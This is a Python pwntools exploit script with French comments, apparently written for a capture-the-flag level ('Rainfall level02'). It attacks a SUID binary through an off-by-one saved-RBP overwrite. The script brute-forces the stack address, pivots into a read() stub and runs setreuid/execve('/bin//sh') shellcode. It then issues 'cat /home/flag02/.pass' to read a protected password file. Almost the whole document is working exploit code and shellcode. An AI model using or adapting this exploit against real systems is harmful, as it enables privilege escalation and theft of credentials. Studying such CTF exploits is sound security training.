#!/usr/bin/env python3
"""
Exploit auto-calibrant pour dixie (Rainfall level02) — off-by-one sur le RBP.

La faille : dans store_record(), la boucle de lecture s'arrete sur `in_len <= BUF_SIZE`
(au lieu de `<`), donc buf[64] est ecrasé — or gcc aligne buf a rbp-0x40 avec
aucun padding : buf[64] EST l'octet de poids faible du RBP sauvegarde.
Un seul octet controlé => on recale le RBP sauvé dans notre buffer.

Que se passe-t-il ensuite :
  - store_record termine par `leave; ret` : rbp = RBP_corrompu, retour a main.
  - main enchaine (dump_records, printf...) puis finit par `leave; ret`.
  - Ce second `leave` fait rsp = rbp_corrompu (= notre buffer) : pop rbp prend
    payload[0:8] (8 octets TOTALEMENT controlés) puis ret saute sur payload[8:16].

Piege majeur : le buffer vit SOUS le rsp de main. Entre le retour de
store_record et le `leave` final, dump_records()/printf() construisent leurs
frames pile pile dessus : empiriquement les octets buf+32..buf+47 sont ecrasés
par la paire (rbp sauvé, adresse de retour) d'un printf. Toute charge utile
placée la bas est detruite avant le pivot. Seule la fenetre buf+16..buf+31
survit (la sonde de calibration "HIT" ne fonctionnait que parce que son write
s'executait avant la zone corrompue).

Solution : exploit en deux etapes.
  Etape 1 : stub de 14 octets dans la fenetre survivante buf+16..buf+29.
            Il herite de rbp = payload[0:8] (pleinement controlé) :
              xor eax,eax ; mov rsi,rbp ; xor edi,edi
              push LEN ; pop rdx ; syscall        -> read(0, buf-0x800, LEN)
              jmp rsi                              -> saute sur le shellcode lu
            buf-0x800 = pile morte, loin sous la zone de blast, executable
            (la pile est RWX sur ce niveau).
  Etape 2 : 46 octets envoyes juste apres le payload. L'ecriture de 46 octets
            (<= PIPE_BUF) est atomique sur le pipe, donc le read() du stub
            les recupere d'un bloc. C'est setreuid(geteuid(),geteuid()) +
            execve("/bin//sh", ["/bin//sh", NULL], NULL) : le SUID flag02
            est conserve, puis un shell lit la suite de stdin.

Phase 1 : calibration. L'adresse de buf depend de l'environnement, on la
          trouve par brute-force avec une sonde position-independante
          (write(1,"HIT\n")) : si on voit HIT, l'adresse devinée etait la bonne.
Phase 2 : exploit réel avec l'adresse calibrée.

Pas besoin d'adresses figées a la main, et ça marche même si GDB décale la pile.
"""
from pwn import *
import sys

BINARY = "./dixie"
context.binary = elf = ELF(BINARY, checksec=False)
context.arch      = "amd64"
context.log_level = "error"

# ─── Sonde : write(1, "HIT\n", 4) ; exit(0) — 100% position-independante ────
# push imm32 depose "HIT\n\0" sur la pile : aucun truc call/pop, donc la sonde
# marche peu importe ou rsp/rip pointent. ATTENTION au faux positif classique :
# dump_records() affiche %.64s de records[0].data (une copie du payload !), un
# shellcode inline contenant "HIT" serait donc "detecte" pour TOUTE adresse.
# Ici la sonde ne transite QUE par stdin (lue par le stub vers la pile morte),
# jamais dans le buffer : seul un pivot reussi peut produire un HIT.
probe_sc = bytes([
    0x68, 0x48, 0x49, 0x54, 0x0a,                  # push 0x0a544948  ("HIT\n\0")
    0x48, 0x89, 0xe6,                              # mov rsi, rsp
    0x6a, 0x01, 0x5f,                              # push 1 ; pop rdi
    0x6a, 0x04, 0x5a,                              # push 4 ; pop rdx
    0x6a, 0x01, 0x58,                              # push 1 ; pop rax
    0x0f, 0x05,                                    # syscall   write(1,"HIT\n",4)
    0x6a, 0x3c, 0x58,                              # push 60 ; pop rax
    0x0f, 0x05,                                    # syscall   exit(0)
])

def build_payload(buf_addr, blob):
    """stub a buf+16 : read(0, buf-0x800, len(blob)) ; jmp rsi."""
    target = buf_addr - 0x800                      # pile morte, executable
    stub = asm(
        "xor eax, eax;"                            # rax = 0 (syscall read)
        "mov rsi, rbp;"                            # rsi = rbp = payload[0:8] = target
        "xor edi, edi;"                            # rdi = 0 (stdin)
        f"push {len(blob)}; pop rdx;"              # rdx = len(blob)
        "syscall;"                                 # read(0, target, len)
        "jmp rsi;",                                # saute sur le shellcode lu
    )
    assert len(stub) <= 16, f"stub trop grand : {len(stub)}"
    assert 16 + len(blob) <= 64

    payload  = p64(target)                         # [0:8]   -> rbp apres le pop de main
    payload += p64(buf_addr + 16)                  # [8:16]  -> rip apres le ret de main
    payload += stub                                # [16:30] fenetre survivante
    payload = payload.ljust(64, b"\x90")           # [30:64] padding
    payload += p8(buf_addr & 0xff)                 # [64]    octet de poids faible du RBP
    assert len(payload) == 65
    return payload

def try_addr(buf_addr, shellcode):
    """Envoie le payload avec ce pivot, renvoie (ok, sortie).

    Le blob (sonde ou shellcode) est envoye JUSTE APRES le payload : le read()
    du programme a deja consomme ses 65 octets, le stub le recupere donc
    integralement via son propre read() et saute dessus."""
    # le RBP sauvé est a buf+0x40 ; l'overwrite du poids faible ne doit toucher
    # QUE cet octet (pas de retenue) : sinon le pivot ne peut pas retomber sur
    # buf — ces adresses (octet bas > 0xbf) sont physiquement inexploitables.
    if ((buf_addr + 0x40) >> 8) != (buf_addr >> 8):
        return False, b""
    payload = build_payload(buf_addr, shellcode)
    io = process(BINARY)
    try:
        io.sendafter(b"Ready: ", payload, timeout=1)
        io.send(shellcode)
        data = io.recvall(timeout=0.4)
        return True, data
    except Exception:
        return False, b""
    finally:
        io.close()

# ─── Phase 1 : calibration de l'adresse de buf ───────────────────────────────
print("[*] Phase 1/2 : calibration — recherche de l'adresse reelle de buf...", flush=True)

FOUND = None
search_ranges = [
    (0x7ffffffd0000, 0x7ffffffff000, 0x10),
]
tested = set()
for lo, hi, step in search_ranges:
    addr = hi - step
    count = 0
    while addr >= lo:
        if addr not in tested:
            tested.add(addr)
            ok, data = try_addr(addr, probe_sc)
            if ok and b"HIT" in data:
                FOUND = addr
                print(f"[+] Adresse trouvee : buf_addr = {hex(addr)}", flush=True)
                break
            count += 1
            if count % 500 == 0:
                print(f"    ... {count} testees, dernier essai {hex(addr)}", flush=True)
        addr -= step
    if FOUND:
        break
    print(f"[*] {count} adresses testees dans {hex(lo)}-{hex(hi)}, rien trouve", flush=True)

if FOUND is None:
    print("[-] Aucune adresse trouvee dans la plage testee.", flush=True)
    sys.exit(1)

# ─── Phase 2 : exploitation reelle ────────────────────────────────────────────
print("[*] Phase 2/2 : read() vers la pile morte puis execve('/bin//sh')...", flush=True)

# setreuid(geteuid(), geteuid()) puis execve("/bin//sh", ["/bin//sh", NULL], NULL)
stage2 = asm(
    "push 0x6b; pop rax; syscall;"                 # geteuid()   (syscall 107)
    "mov rdi, rax; mov rsi, rax;"
    "push 0x71; pop rax; syscall;"                 # setreuid(euid, euid)  (syscall 113)
    "xor rsi, rsi; push rsi;"                      # NULL
    "movabs rdi, 0x68732f2f6e69622f;"              # "/bin//sh"
    "push rdi; mov rdi, rsp;"                      # rdi = &"/bin//sh"
    "push rsi; push rdi; mov rsi, rsp;"            # argv = {"/bin//sh", NULL}
    "xor edx, edx;"                                # envp = NULL
    "push 0x3b; pop rax; syscall;",                # execve
)
assert len(stage2) <= 64

buf_addr = FOUND
payload = build_payload(buf_addr, stage2)

io = process(BINARY)
io.sendafter(b"Ready: ", payload)                  # le read du programme prend 65 octets pile
io.send(stage2)                                    # lu par le stub vers buf-0x800

try:
    io.recvuntil(b"session closed.", timeout=3)
except Exception as e:
    print(f"[-] Pas vu 'session closed.' : {e}", flush=True)

io.sendline(b"id")
io.sendline(b"cat /home/flag02/.pass")

out = io.recvall(timeout=3)
print("[*] Sortie decodée :", flush=True)
print(out.decode(errors="replace"), flush=True)

if b"flag02" in out:
    print("[+] SUID conserve, UID = flag02. Le mot de passe est ci-dessus.", flush=True)
else:
    print("[-] UID ne semble pas etre flag02 — voir la sortie ci-dessus.", flush=True)